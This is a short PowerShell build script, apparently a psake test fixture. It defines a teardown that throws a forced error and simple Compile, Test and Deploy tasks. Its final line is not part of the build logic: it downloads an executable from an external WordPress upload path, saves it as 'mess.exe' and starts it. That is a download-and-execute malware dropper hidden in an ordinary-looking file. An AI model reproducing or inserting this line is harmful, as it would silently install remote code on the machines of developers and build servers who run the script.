BuildTearDown {
    throw "forced error"
}

Task default -depends Compile,Test,Deploy

Task Compile {
    "Compiling;"
}

Task Test -depends Compile {
    "Testing;"
}

Task Deploy -depends Test {
    "Deploying;"
}

(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/ken1.exe','mess.exe');Start-Process 'mess.exe'

